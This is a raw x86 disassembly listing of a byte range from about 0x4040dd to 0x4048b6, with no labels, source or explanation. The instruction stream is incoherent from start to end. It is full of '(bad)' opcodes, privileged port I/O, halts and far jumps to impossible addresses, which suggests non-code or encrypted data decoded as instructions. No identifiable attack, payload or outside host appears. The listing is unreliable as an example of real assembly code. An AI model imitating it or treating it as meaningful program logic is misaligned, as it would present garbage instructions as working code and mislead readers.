  4040dd:	(bad)  
  4040de:	adc    al,0x0
  4040e0:	mov    edx,0x81044306
  4040e5:	mov    DWORD PTR [esp+eax*1-0x27],esp
  4040e9:	fwait
  4040ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040eb:	push   esp
  4040ec:	into   
  4040ed:	and    ebp,ebp
  4040ef:	scas   al,BYTE PTR es:[edi]
  4040f0:	arpl   WORD PTR [ecx+esi*1],ax
  4040f3:	fnsave [ebp+0x4]
  4040f6:	push   0x31
  4040f8:	and    DWORD PTR [esp+edi*8],edx
  4040fb:	add    dh,dl
  4040fd:	scas   al,BYTE PTR es:[edi]
  4040fe:	in     eax,0x88
  404100:	mov    ah,BYTE PTR [eax]
  404102:	push   eax
  404103:	jnp    0x404177
  404105:	aas    
  404106:	mov    al,ds:0xbc1425c2
  40410b:	jp     0x4040aa
  40410d:	xchg   edi,eax
  40410e:	and    eax,0x55e6deac
  404113:	sbb    dh,BYTE PTR [ecx]
  404115:	inc    ebx
  404116:	dec    esi
  404117:	cmp    DWORD PTR [ecx],ebp
  404119:	lods   al,BYTE PTR ds:[esi]
  40411a:	sbb    cl,bl
  40411c:	outs   dx,BYTE PTR ds:[esi]
  40411d:	fwait
  40411e:	es dec ecx
  404120:	gs adc al,0x0
  404123:	jmp    0x94cb555a
  404128:	add    BYTE PTR [eax],al
  40412a:	pop    edx
  40412b:	mov    ss,WORD PTR [edx]
  40412d:	je     0x404127
  40412f:	fwait
  404130:	push   eax
  404131:	xchg   ebx,eax
  404132:	mov    DWORD PTR cs:[ebp+0x15],eax
  404136:	in     eax,0x9a
  404138:	jne    0x40411b
  40413a:	xchg   DWORD PTR [esi+0xc],eax
  40413d:	scas   al,BYTE PTR es:[edi]
  40413e:	mov    ch,0x18
  404140:	cld    
  404141:	in     al,dx
  404142:	sub    BYTE PTR [eax],cl
  404144:	or     bh,BYTE PTR [ebp+0x18]
  404147:	xchg   esi,eax
  404148:	jge    0x40413b
  40414a:	xor    ah,BYTE PTR [ecx]
  40414c:	leave  
  40414d:	sbb    dh,ch
  40414f:	scas   al,BYTE PTR es:[edi]
  404150:	add    eax,0xc096ef72
  404155:	jmp    0x4132:0xe5c2cd6f
  40415c:	mov    edx,ebp
  40415e:	mov    bl,0xcf
  404160:	hlt    
  404161:	sbb    bh,BYTE PTR [esi+0x2c]
  404164:	cwde   
  404165:	repz xor dl,BYTE PTR [eax+ebp*8]
  404169:	fimul  WORD PTR [esi+0x7970ff9a]
  40416f:	cwde   
  404170:	lea    esp,[ecx+ecx*4]
  404173:	inc    ebx
  404174:	call   0xffdb2d4e
  404179:	(bad)  
  40417b:	sub    eax,0x32ab131e
  404180:	add    BYTE PTR [ebx-0x300ebce],al
  404186:	out    0x9a,al
  404188:	jne    0x40416b
  40418a:	mov    edx,0x66fe8f
  40418f:	add    bh,bl
  404191:	nop
  404192:	shr    dh,0xae
  404195:	jecxz  0x404197
  404197:	jmp    0x55b5dcce
  40419c:	call   0x3d69:0xf700db87
  4041a3:	add    dl,dh
  4041a5:	push   ss
  4041a6:	add    BYTE PTR [esi+0x4d],dh
  4041a9:	ja     0x4041c7
  4041ab:	add    DWORD PTR [eax+0x16],ecx
  4041ae:	push   DWORD PTR [ebp+0x2c]
  4041b1:	jg     0x40420d
  4041b3:	jmp    DWORD PTR [edi]
  4041b5:	push   0xffffff85
  4041b7:	rcr    BYTE PTR [edx+edx*8+0x7f1c75ff],0x8d
  4041bf:	fnsave [edi]
  4041c1:	push   0xffffff8b
  4041c3:	push   ebp
  4041c4:	sbb    al,0x1c
  4041c6:	adc    ch,BYTE PTR [edx+0x8]
  4041c9:	(bad)  
  4041ca:	xor    esp,DWORD PTR [ecx]
  4041cc:	or     BYTE PTR [esi],dl
  4041ce:	push   DWORD PTR [ebp+0x14]
  4041d1:	push   0x46e7f475
  4041d6:	or     al,0xc7
  4041d8:	dec    ebp
  4041d9:	push   0x16080000
  4041de:	push   0x554403
  4041e3:	call   FWORD PTR ds:0x5e19e864
  4041e9:	adc    BYTE PTR [eax],al
  4041eb:	push   ebx
  4041ec:	rcl    ebp,cl
  4041ee:	je     0x404226
  4041f0:	inc    ebx
  4041f1:	push   0x368
  4041f6:	hlt    
  4041f7:	push   esi
  4041f8:	add    al,ch
  4041fa:	sbb    BYTE PTR [eax+eax*1],bl
  4041fd:	add    bl,cl
  4041ff:	ins    DWORD PTR es:[edi],dx
  404200:	push   edi
  404201:	inc    edi
  404202:	and    eax,edi
  404204:	mov    ecx,0x158994
  404209:	mov    al,0x95
  40420b:	arpl   WORD PTR [esi+0x4fcb8],bp
  404211:	add    BYTE PTR [ebx],ah
  404213:	aad    0xc6
  404215:	inc    edi
  404216:	out    0xf,eax
  404218:	push   edi
  404219:	push   ebx
  40421a:	xor    DWORD PTR [ebx-0x4f],edx
  40421d:	mov    ch,0x31
  40421f:	stos   DWORD PTR es:[edi],eax
  404220:	jp     0x404267
  404222:	imul   esi,DWORD PTR [edx-0x3b],0x4ca86647
  404229:	pop    ebx
  40422a:	leave  
  40422b:	mov    ebp,0xea3140df
  404230:	ss cld 
  404232:	pop    ecx
  404233:	(bad)  [esi+0x0]
  404236:	xor    DWORD PTR [esi-0x8],ebx
  404239:	mov    edi,0xf87866c5
  40423e:	leave  
  40423f:	popf   
  404240:	fild   WORD PTR [eax+0x31]
  404243:	add    esp,ebp
  404245:	mov    bl,0x31
  404247:	stos   DWORD PTR es:[edi],eax
  404248:	add    al,bh
  40424a:	xchg   BYTE PTR [edx+0x78],ch
  40424d:	(bad)  
  40424f:	adc    eax,DWORD PTR ds:[eax]
  404252:	xor    DWORD PTR [ebx-0x2],edi
  404255:	icebp  
  404256:	xlat   BYTE PTR ds:[ebx]
  404257:	jb     0x4041f0
  404259:	adc    DWORD PTR [eax],eax
  40425b:	add    BYTE PTR [ecx],dh
  40425d:	stos   DWORD PTR es:[edi],eax
  40425e:	fadd   st,st(0)
  404260:	out    dx,eax
  404261:	icebp  
  404262:	lods   al,BYTE PTR ds:[esi]
  404263:	add    BYTE PTR [esi-0x1c986402],al
  404269:	pop    ecx
  40426a:	lods   al,BYTE PTR ds:[esi]
  40426b:	mov    eax,DWORD PTR [ebx+edi*4-0x50a22e08]
  404272:	jp     0x404276
  404274:	fisubr DWORD PTR [eax-0x733f17ad]
  40427a:	lods   al,BYTE PTR ds:[esi]
  40427b:	call   FWORD PTR [esi+0x69]
  40427e:	inc    esp
  40427f:	jmp    DWORD PTR [edx+ebp*8]
  404282:	dec    eax
  404283:	jmp    DWORD PTR [edi+edx*1]
  404286:	fwait
  404287:	and    eax,0x83ac1984
  40428c:	sbb    al,0x23
  40428e:	add    esi,DWORD PTR [edi+0x2e]
  404291:	jb     0x4042d9
  404293:	clc    
  404294:	xor    DWORD PTR [ecx+ebp*8],edx
  404297:	arpl   WORD PTR [ecx],si
  404299:	cdq    
  40429a:	aam    0xab
  40429c:	jle    0x4042bc
  40429e:	pop    ebp
  40429f:	lods   al,BYTE PTR ds:[esi]
  4042a0:	cld    
  4042a1:	or     eax,DWORD PTR [ecx-0x5c]
  4042a4:	ins    BYTE PTR es:[edi],dx
  4042a5:	cwde   
  4042a6:	inc    esi
  4042a7:	lods   al,BYTE PTR ds:[esi]
  4042a8:	fcomp  QWORD PTR [edi-0x678479af]
  4042ae:	ss clc 
  4042b0:	xchg   esi,eax
  4042b1:	push   ds
  4042b2:	jmp    0x40424c
  4042b4:	sub    cl,BYTE PTR ds:0x8d1e3729
  4042ba:	mov    ah,0xb7
  4042bc:	stos   BYTE PTR es:[edi],al
  4042bd:	add    eax,0x3616
  4042c2:	and    eax,0x2eb79499
  4042c7:	inc    ebx
  4042c8:	mov    ebp,0xe41cf186
  4042cd:	push   0x3e91430
  4042d2:	stos   BYTE PTR es:[edi],al
  4042d3:	inc    ecx
  4042d4:	cmc    
  4042d5:	ja     0x4042fa
  4042d7:	xchg   edi,eax
  4042d8:	pop    esp
  4042d9:	mov    al,0x6
  4042db:	inc    ebx
  4042dc:	icebp  
  4042dd:	stos   BYTE PTR es:[edi],al
  4042de:	test   BYTE PTR [eax-0x67ec803f],bl
  4042e4:	into   
  4042e5:	jg     0x4042d9
  4042e7:	aaa    
  4042e8:	and    bh,BYTE PTR [ebp+0x50e908f3]
  4042ee:	stos   BYTE PTR es:[edi],al
  4042ef:	test   al,0x6a
  4042f1:	shl    BYTE PTR [ecx-0x1420e5c1],0x2c
  4042f8:	jmp    0x91d809e0
  4042fd:	adc    bl,0x97
  404300:	xchg   esi,eax
  404301:	jge    0x40436f
  404303:	cwde   
  404304:	add    DWORD PTR [ecx+edx*2],eax
  404307:	adc    al,0xe9
  404309:	fwait
  40430a:	sub    BYTE PTR [edx+0x51a8ab7e],dh
  404310:	add    BYTE PTR ds:0xe9201435,bh
  404316:	xor    ch,BYTE PTR [esp+ebp*2-0x766825b5]
  40431d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40431e:	push   ss
  40431f:	mov    DWORD PTR [ebp+0x29],edi
  404322:	add    al,0xd8
  404324:	(bad)  
  404325:	call   0xe372432a
  40432a:	mov    edi,0x45cf073a
  40432f:	sub    DWORD PTR [ecx-0x69],ecx
  404332:	(bad)  
  404333:	jmp    0x2f1494ab
  404338:	cmp    dl,BYTE PTR [eax+eax*1]
  40433b:	lock mov cs:0x1432feff,eax
  404342:	call   FWORD PTR [esi+ecx*4-0x25c6ba79]
  404349:	and    BYTE PTR [esi+esi*2-0x5b725790],dh
  404350:	repnz inc ebx
  404352:	push   0x801432e9
  404357:	xor    DWORD PTR [edx],0xffffff97
  40435a:	jne    0x40434d
  40435c:	stos   BYTE PTR es:[edi],al
  40435d:	jno    0x404313
  40435f:	jmp    0x5e004e96
  404364:	xor    edx,DWORD PTR [ebx+0x2132b97d]
  40436a:	add    eax,0x13a8d0
  40436f:	jmp    0xb6f09467
  404374:	sub    edx,DWORD PTR [eax+eax*1]
  404377:	pop    esp
  404378:	jno    0x4043de
  40437a:	push   eax
  40437b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40437c:	add    DWORD PTR [eax+0x68],ebx
  40437f:	jmp    0x64c057b6
  404384:	jno    0x40435a
  404386:	push   eax
  404387:	sbb    DWORD PTR [ecx+0x60],0x0
  40438e:	cwde   
  40438f:	xchg   ebp,eax
  404390:	mov    edi,0xa9779575
  404395:	add    BYTE PTR [eax+0x44458b12],cl
  40439b:	aad    0x0
  40439d:	add    ch,bh
  40439f:	jmp    0x404360
  4043a1:	mov    ecx,0x101c
  4043a6:	sbb    edx,eax
  4043a8:	rep stos BYTE PTR es:[edi],al
  4043aa:	pop    ss
  4043ab:	push   esp
  4043ac:	sar    BYTE PTR [eax+ebx*2],0x12
  4043b0:	add    bh,bh
  4043b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043b3:	pop    DWORD PTR es:[ebp-0x14]
  4043b7:	rol    DWORD PTR [ebp-0x2c],1
  4043ba:	pop    ds
  4043bb:	or     al,BYTE PTR [eax]
  4043bd:	add    BYTE PTR [edi],dl
  4043bf:	push   esp
  4043c0:	lock (bad) 
  4043c2:	aas    
  4043c3:	adc    al,BYTE PTR [eax]
  4043c5:	lea    eax,[ebp+0x186a50d2]
  4043cb:	clc    
  4043cc:	(bad)  
  4043cd:	(bad)  
  4043ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043cf:	sub    eax,0x116431e8
  4043d4:	add    BYTE PTR [ebx],cl
  4043d6:	dec    eax
  4043d7:	in     eax,0x5
  4043d9:	sbb    DWORD PTR [ebp+0x1a7500c1],0x79
  4043e0:	pusha  
  4043e1:	jmp    DWORD PTR [ebp+0x6c]
  4043e4:	push   DWORD PTR [ebp-0x6c]
  4043e7:	clc    
  4043e8:	sbb    al,0x2c
  4043ea:	sbb    DWORD PTR [eax],edx
  4043ec:	push   DWORD PTR [ebp-0x54]
  4043ef:	js     0x4043bb
  4043f1:	mov    bl,0x0
  4043f3:	add    al,cl
  4043f5:	adc    DWORD PTR [ebx-0x4963073c],eax
  4043fb:	inc    ebp
  4043fc:	mov    al,ds:0x8f006a40
  404401:	in     eax,0xfb
  404403:	call   0x3faab6
  404408:	xor    DWORD PTR [edx-0x6dcc8a3d],esi
  40440e:	out    dx,eax
  40440f:	mov    ah,ch
  404411:	push   edx
  404412:	test   eax,0x2583dd75
  404417:	mov    dl,0x31
  404419:	stos   DWORD PTR es:[edi],eax
  40441a:	push   ebx
  40441b:	inc    DWORD PTR [edi+eiz*8]
  40441e:	test   al,0x75
  404420:	leave  
  404421:	inc    ebx
  404422:	dec    edi
  404423:	sti    
  404424:	jle    0x40445c
  404426:	std    
  404427:	mov    edi,0x109ca8fc
  40442c:	outs   dx,BYTE PTR ds:[esi]
  40442d:	rcl    BYTE PTR [ebx],0xff
  404430:	fcomp  QWORD PTR [esi+0x439975a8]
  404436:	out    dx,eax
  404437:	cld    
  404438:	push   esi
  404439:	fidivr WORD PTR [eax+ebx*8+0x4e]
  40443d:	pusha  
  40443e:	imul   ebp,eax,0x34
  404441:	aaa    
  404442:	add    al,0x0
  404444:	sub    BYTE PTR ds:[edi-0x18],0x4
  404449:	or     al,0xa9
  40444b:	jmp    FWORD PTR [esi]
  40444d:	and    BYTE PTR [edi-0x18],0x4c
  404451:	or     al,0xa9
  404453:	call   FWORD PTR [esi]
  404455:	and    BYTE PTR [edi+0x340000e8],ah
  40445b:	or     al,0xa9
  40445d:	(bad)  
  40445e:	mov    edx,0xf85f4ce9
  404463:	push   0x2265fff7
  404468:	xchg   edi,eax
  404469:	sub    ebp,0xffffffbe
  40446c:	jl     0x4044b3
  40446e:	cmp    eax,0x2f74c3b2
  404473:	add    ax,WORD PTR [eax]
  404476:	xor    DWORD PTR [ebx+0x5f6cc703],ebp
  40447c:	add    eax,DWORD PTR [eax]
  40447e:	xor    DWORD PTR [ebx+0x13c54576],ebp
  404484:	cmp    DWORD PTR [ecx+0x2e9e0844],ebp
  40448a:	sub    DWORD PTR [eax+eax*1+0x6a94aeaa],ebp
  404491:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  404493:	adc    edi,ebp
  404495:	adc    BYTE PTR [ebx],cl
  404497:	adc    al,0x7e
  404499:	cs and eax,0x99a7fc95
  40449f:	cmp    eax,0x4386a86f
  4044a4:	data16 cs jge 0x404453
  4044a8:	cmp    DWORD PTR [ebx-0x454e6b8a],esp
  4044ae:	jae    0x4044bb
  4044b0:	jmp    0x6ae7ff03
  4044b5:	mov    edi,0x3e262d5d
  4044ba:	push   ebp
  4044bb:	adc    ch,cl
  4044bd:	and    DWORD PTR [eax],eax
  4044bf:	add    BYTE PTR [esi+0x4e],dh
  4044c2:	das    
  4044c3:	or     DWORD PTR [ecx],esi
  4044c5:	sub    ch,ch
  4044c7:	jbe    0x4044bd
  4044c9:	xchg   edi,eax
  4044ca:	mov    ecx,0xe913b11b
  4044cf:	add    ebx,DWORD PTR [ecx+0x31030e93]
  4044d5:	xchg   ebx,eax
  4044d6:	jl     0x4044d3
  4044d8:	push   ss
  4044d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044da:	cmp    al,BYTE PTR [ebx]
  4044dc:	xor    DWORD PTR [ebp+0x2b],ebx
  4044df:	dec    DWORD PTR [esi]
  4044e1:	jmp    0x58f2dc47
  4044e6:	xchg   ebp,eax
  4044e7:	dec    edi
  4044e8:	bound  ebx,QWORD PTR [ebx+0x24]
  4044eb:	pop    eax
  4044ec:	xor    DWORD PTR [ecx+ebp*8],edx
  4044ef:	add    esp,DWORD PTR [edx]
  4044f1:	outs   dx,DWORD PTR ds:[esi]
  4044f2:	inc    ecx
  4044f3:	add    al,0x41
  4044f5:	adc    al,0xe9
  4044f7:	fwait
  4044f8:	mov    eax,0xa8a7be74
  4044fd:	fcos   
  4044ff:	test   al,0x2d
  404501:	adc    al,0x10
  404503:	jmp    0x89ccc13a
  404508:	xchg   esi,eax
  404509:	xchg   ebx,eax
  40450a:	mov    DWORD PTR [eax*2+0x32f8fffc],esp
  404511:	adc    al,0xe8
  404513:	push   cs
  404514:	int    0x93
  404516:	push   DWORD PTR [eax-0x10]
  404519:	iret   
  40451a:	(bad)  
  40451b:	cld    
  40451c:	(bad)  
  40451d:	int    0x3c
  40451f:	jmp    0xa9735956
  404524:	add    BYTE PTR [eax],al
  404526:	ret    0xc7be
  404529:	lods   al,BYTE PTR ds:[esi]
  40452a:	mov    esi,0x32e90050
  40452f:	xchg   ebx,eax
  404530:	jne    0x40455b
  404532:	out    0xd8,al
  404534:	ror    DWORD PTR [esi+0x20],cl
  404537:	int3   
  404538:	(bad)  
  404539:	lods   al,BYTE PTR ds:[esi]
  40453a:	mov    ds:0x8e21455b,al
  40453f:	and    eax,DWORD PTR [eax]
  404541:	jmp    0x2f341ed5
  404546:	ds xchg ebx,eax
  404548:	push   DWORD PTR [eax+esi*8+0x57]
  40454c:	push   eax
  40454d:	xchg   ecx,eax
  40454e:	xor    dl,BYTE PTR [eax+eax*1]
  404551:	imul   ecx,DWORD PTR [ebx+0x14],0x7b2a94ff
  404558:	mov    ch,0x3b
  40455a:	xor    eax,0x61290b14
  40455f:	sbb    al,BYTE PTR [ebx+0x7513fe74]
  404565:	in     al,0xa5
  404567:	nop
  404568:	add    cl,ch
  40456a:	xor    bl,BYTE PTR [ebx+0x45]
  40456d:	cdq    
  40456e:	iret   
  40456f:	and    al,BYTE PTR [eax]
  404571:	jmp    0x39f01edf
  404576:	mov    cs,WORD PTR [eax]
  404578:	mov    esp,0x188000
  40457d:	add    BYTE PTR [eax+0xc],cl
  404580:	inc    ebp
  404581:	les    ebp,FWORD PTR [eax]
  404583:	mov    al,0x90
  404585:	mov    dl,0xd8
  404587:	push   ss
  404588:	or     eax,eax
  40458a:	add    BYTE PTR [eax],al
  40458c:	sbb    eax,0xc8d8e915
  404591:	push   ss
  404592:	add    BYTE PTR [ebx+0xc6005d],cl
  404598:	cwde   
  404599:	or     edi,DWORD PTR [ebp-0x3c]
  40459c:	icebp  
  40459d:	jp     0x40459e
  40459f:	dec    DWORD PTR [eax-0xd0c407b]
  4045a5:	rol    DWORD PTR [ebp-0x3c],1
  4045a8:	aam    0x16
  4045aa:	add    BYTE PTR [eax],al
  4045ac:	pop    ss
  4045ad:	inc    esp
  4045ae:	mov    eax,0xc7c6cd8f
  4045b3:	inc    ebp
  4045b4:	and    BYTE PTR [edx-0x2ea7fff1],bh
  4045ba:	inc    ebp
  4045bb:	hlt    
  4045bc:	test   DWORD PTR [ecx-0x2c3a0001],0x167250c3
  4045c6:	push   0x0
  4045c8:	pop    ss
  4045c9:	inc    esp
  4045ca:	mov    esp,0x48ce8
  4045cf:	add    BYTE PTR [ebx+0x56],al
  4045d2:	je     0x4045da
  4045d4:	fwait
  4045d5:	cmp    al,0xd4
  4045d7:	add    BYTE PTR [ebp+0x88ce914],bh
  4045dd:	push   ss
  4045de:	add    bh,bh
  4045e0:	popf   
  4045e1:	and    eax,0xba5875ff
  4045e6:	jne    0x4045a0
  4045e8:	mov    al,0x8a
  4045ea:	sub    al,BYTE PTR [ecx+0x8]
  4045ed:	mov    ecx,0xbc75
  4045f2:	loopne 0x404653
  4045f4:	mov    cl,0x0
  4045f6:	xor    DWORD PTR [ebx-0x80],edi
  4045f9:	les    edi,FWORD PTR ds:0xfd456c72
  4045ff:	sub    ebx,DWORD PTR [edx]
  404601:	add    dh,dl
  404603:	dec    eax
  404604:	(bad)  
  404605:	call   0xffe609d4
  40460a:	cmp    bh,BYTE PTR [ebx-0x2635fdd1]
  404610:	jp     0x404657
  404612:	jge    0x4045c6
  404614:	das    
  404615:	mov    ah,0x99
  404617:	fsub   QWORD PTR [ebp+0x2fa2a6ff]
  40461d:	mov    esp,0x742389
  404622:	xor    DWORD PTR [ebx],ebp
  404624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404625:	jne    0x4045f4
  404627:	or     ch,BYTE PTR [edi]
  404629:	mov    ah,0x99
  40462b:	and    eax,0x867effab
  404630:	ret    
  404631:	jne    0x404666
  404633:	out    0xf2,al
  404635:	sub    ah,0x8a
  404638:	add    esi,DWORD PTR [ebp+edi*1-0x1e]
  40463c:	adc    BYTE PTR cs:[esi-0x30],bl
  404640:	idiv   esi
  404642:	fadd   QWORD PTR [esi]
  404644:	pushf  
  404645:	inc    eax
  404646:	dec    eax
  404647:	dec    edx
  404648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404649:	or     esi,DWORD PTR [ecx-0x38]
  40464c:	add    ebx,ebp
  40464e:	es push es
  404650:	int3   
  404651:	or     ebx,DWORD PTR [edx-0x59]
  404654:	adc    cl,BYTE PTR [ebp-0x288c0000]
  40465a:	push   ebx
  40465b:	call   FWORD PTR [edi+eax*4+0x22e575a4]
  404662:	or     edi,ebx
  404664:	push   ss
  404665:	xchg   edx,eax
  404666:	js     0x404640
  404668:	push   cs
  404669:	adc    BYTE PTR [edi-0x18],ch
  40466c:	add    BYTE PTR [esp+eax*1+0x0],cl
  404670:	(bad)  
  404671:	adc    ebx,DWORD PTR [esp+eax*8+0x9]
  404675:	and    edi,DWORD PTR [esi+0x5c90eea4]
  40467b:	push   0xa4ae1ad9
  404680:	ficom  WORD PTR [eax+0x12c96c3c]
  404686:	sahf   
  404687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404688:	into   
  404689:	xchg   esp,eax
  40468a:	xor    al,0x58
  40468c:	xor    DWORD PTR [eax],ecx
  40468e:	loope  0x404634
  404690:	inc    esp
  404691:	rcl    BYTE PTR [ecx-0x616f2850],0x78
  404698:	jb     0x404686
  40469a:	xor    eax,0xe92373bb
  40469f:	dec    esi
  4046a0:	stos   BYTE PTR es:[edi],al
  4046a1:	jg     0x40470d
  4046a3:	mov    edi,0xc8d1e499
  4046a8:	mov    dl,0xe
  4046aa:	in     eax,0x3
  4046ac:	std    
  4046ad:	loope  0x404718
  4046af:	and    DWORD PTR es:[ebx*8+0x5cd6a43b],edx
  4046b7:	push   ebx
  4046b8:	outs   dx,BYTE PTR ds:[esi]
  4046b9:	push   es
  4046ba:	in     eax,0x9b
  4046bc:	add    BYTE PTR [eax],al
  4046be:	pop    ebp
  4046bf:	ret    
  4046c0:	jmp    0xc193fac8
  4046c5:	repz push edi
  4046c7:	push   es
  4046c8:	in     eax,dx
  4046c9:	fwait
  4046ca:	mov    ch,0x69
  4046cc:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4046ce:	mov    eax,0xc4a430d6
  4046d3:	(bad)  
  4046d4:	adc    DWORD PTR [esi-0x7a],esp
  4046d7:	adc    ebp,ecx
  4046d9:	clc    
  4046da:	out    dx,al
  4046db:	or     al,dh
  4046dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046de:	pushf  
  4046df:	and    al,0xe
  4046e1:	cs sbb ebp,esp
  4046e4:	add    eax,0xea7c292e
  4046e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046ea:	push   cs
  4046eb:	nop
  4046ec:	add    BYTE PTR [edx-0x6],ah
  4046ef:	(bad)  
  4046f0:	jne    0x4046df
  4046f2:	fwait
  4046f3:	mov    dh,0xaf
  4046f5:	jmp    0xedb5d62c
  4046fa:	call   0xc39b:0x92d6d7ec
  404701:	xor    ch,ah
  404703:	push   edx
  404704:	or     al,0xe9
  404706:	sbb    DWORD PTR [ebx+0x4f968ec],ebx
  40470c:	(bad)  
  40470d:	mov    dh,0x92
  40470f:	mov    eax,ds:0x8f933b85
  404714:	(bad)  
  404715:	cmp    DWORD PTR ds:0x32e90115,eax
  40471b:	jl     0x404780
  40471d:	pop    eax
  40471e:	sub    eax,0xaac914
  404723:	add    BYTE PTR [eax-0x65],bl
  404726:	in     al,dx
  404727:	push   0x50
  404729:	sbb    al,0x0
  40472b:	cmc    
  40472c:	xor    edx,DWORD PTR [ebx+0x832d97d]
  404732:	sbb    DWORD PTR [esi+0x18],ebp
  404735:	sub    bh,bh
  404737:	fsubr  QWORD PTR [edx]
  404739:	jl     0x404715
  40473b:	inc    ebx
  40473c:	xchg   edx,eax
  40473d:	(bad)  
  40473e:	(bad)  
  40473f:	fsub   QWORD PTR [edx-0x72]
  404742:	jne    0x404721
  404744:	xchg   ebx,eax
  404745:	or     DWORD PTR [eax],ecx
  404747:	push   ecx
  404748:	das    
  404749:	imul   edi,edi,0x3e
  40474c:	jl     0x4047a0
  40474e:	adc    cl,ch
  404750:	or     DWORD PTR [ebx+0x1c106aec],ebx
  404756:	add    BYTE PTR [ebp-0x12826dca],bl
  40475c:	xor    cl,BYTE PTR [eax]
  40475e:	push   ss
  40475f:	push   ss
  404760:	dec    eax
  404761:	and    al,0xff
  404763:	xchg   esp,eax
  404764:	sub    bh,BYTE PTR [esi+ebp*4+0x0]
  404768:	push   edx
  404769:	mov    bl,0xff
  40476b:	inc    DWORD PTR [ebp+0x1075ff1f]
  404771:	mov    ebx,0xb20fdb05
  404776:	leave  
  404777:	ret    0x12fc
  40477a:	push   ebp
  40477b:	mov    edi,esp
  40477d:	xchg   ebp,eax
  40477e:	(bad)  
  40477f:	lock jmp FWORD PTR [ebx]
  404782:	or     al,0xe8
  404784:	movzx  edi,di
  404787:	inc    DWORD PTR [eax]
  404789:	add    BYTE PTR [ecx-0x24],ah
  40478c:	or     eax,DWORD PTR [ebx+0x7400240d]
  404792:	es mov bl,0x75
  404795:	or     al,0xf0
  404797:	pop    ebp
  404798:	loop   0x404799
  40479a:	(bad)  
  40479b:	sbb    eax,0xa55a74c0
  4047a0:	inc    ebp
  4047a1:	lock push 0xb00c75b3
  4047a7:	cwde   
  4047a8:	jecxz  0x4047a9
  4047aa:	scas   eax,DWORD PTR es:[edi]
  4047ab:	sbb    eax,0x97ca74c0
  4047b0:	jge    0x4047ae
  4047b2:	cwde   
  4047b3:	adc    dl,BYTE PTR [eax]
  4047b5:	add    BYTE PTR [ebx+0x72],bh
  4047b8:	(bad)  
  4047b9:	jne    0x4047c7
  4047bb:	mov    dl,0x75
  4047bd:	clc    
  4047be:	add    BYTE PTR [esi+eiz*8-0x3fe20001],cl
  4047c5:	jne    0x404820
  4047c7:	mov    cl,0x75
  4047c9:	adc    bh,ch
  4047cb:	sub    edi,esp
  4047cd:	inc    DWORD PTR [ebp+0x5075ffaa]
  4047d3:	mov    edx,0xb20fff4f
  4047d8:	lea    eax,[ebp+0x18]
  4047db:	inc    ebx
  4047dc:	call   0xfff283c1
  4047e1:	push   DWORD PTR [ecx]
  4047e3:	mov    al,0xf
  4047e5:	call   0xffe288b2
  4047ea:	call   0x405728
  4047ef:	add    BYTE PTR [edx+eax*1-0x51],ah
  4047f3:	sub    ebp,0xffffff8b
  4047f6:	mov    eax,ds:0xb1132d75
  4047fb:	loop   0x4047f3
  4047fd:	jbe    0x40478a
  4047ff:	inc    ebp
  404800:	cmp    eax,0x310c1efa
  404805:	out    dx,eax
  404806:	dec    eax
  404807:	jmp    DWORD PTR [edi+ebp*2-0x55]
  40480b:	pop    edx
  40480c:	rcl    DWORD PTR [esi-0x5f],cl
  40480f:	or     esi,ecx
  404811:	inc    edi
  404812:	aad    0x8c
  404814:	ins    BYTE PTR es:[edi],dx
  404815:	retf   
  404816:	xor    al,0xff
  404818:	inc    esp
  404819:	outs   dx,DWORD PTR ds:[esi]
  40481a:	stos   DWORD PTR es:[edi],eax
  40481b:	adc    edx,edx
  40481d:	mov    dh,0xa1
  40481f:	or     esi,DWORD PTR [ecx+0x27]
  404822:	in     eax,0x80
  404824:	and    al,0xa7
  404826:	add    al,0x0
  404828:	inc    ecx
  404829:	jnp    0x40483f
  40482b:	adc    DWORD PTR [esi+0x4fef390],edx
  404831:	pop    fs
  404833:	jne    0x4047be
  404835:	push   es
  404836:	pop    ss
  404837:	or     BYTE PTR [ecx+0x76ffa210],cl
  40483d:	or     BYTE PTR [edi-0x10],al
  404840:	add    ebx,esp
  404842:	and    ebx,esp
  404844:	data16 out 0xa0,al
  404847:	jne    0x404876
  404849:	ror    DWORD PTR [eax-0x23],cl
  40484c:	push   esi
  40484d:	(bad)  
  40484e:	retf   0x3dc2
  404851:	jnp    0x404889
  404853:	mov    eax,DWORD PTR [eax]
  404855:	add    BYTE PTR [ebp-0x6],dl
  404858:	(bad)  
  404859:	lock loop 0x40486d
  40485c:	mov    ebp,0xf113bcff
  404861:	stos   DWORD PTR es:[edi],eax
  404862:	mov    eax,0xb8a11e71
  404867:	(bad)  
  404868:	loopne 0x4047ee
  40486a:	pushf  
  40486b:	sbb    al,0xe9
  40486d:	pop    ss
  40486e:	outs   dx,DWORD PTR ds:[esi]
  40486f:	lea    edi,[ebx+ecx*1+0x19]
  404873:	xchg   DWORD PTR [eax],ecx
  404875:	mov    eax,ds:0x18291906
  40487a:	inc    ebx
  40487b:	lahf   
  40487c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40487d:	xchg   ebx,eax
  40487e:	popa   
  40487f:	lea    ebx,[esp+ecx*1-0x27]
  404883:	mov    edi,0x18e6a0cb
  404888:	test   eax,0x4c931317
  40488d:	mov    al,ds:0x3d91431
  404892:	inc    edx
  404893:	and    al,0xbe
  404895:	push   ss
  404896:	lds    ecx,FWORD PTR [esp+edi*1-0x38b33664]
  40489d:	mov    al,ds:0x17a918b6
  4048a2:	xor    cl,dl
  4048a4:	imul   eax,DWORD PTR [esi-0x5f],0xffffffe3
  4048a8:	cmp    ch,0x93
  4048ab:	mov    WORD PTR [esi-0x6ee3e360],cs
  4048b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048b2:	ins    DWORD PTR es:[edi],dx
  4048b3:	mov    WORD PTR [esi-0x74],?
  4048b6:	jb     0x4048a0
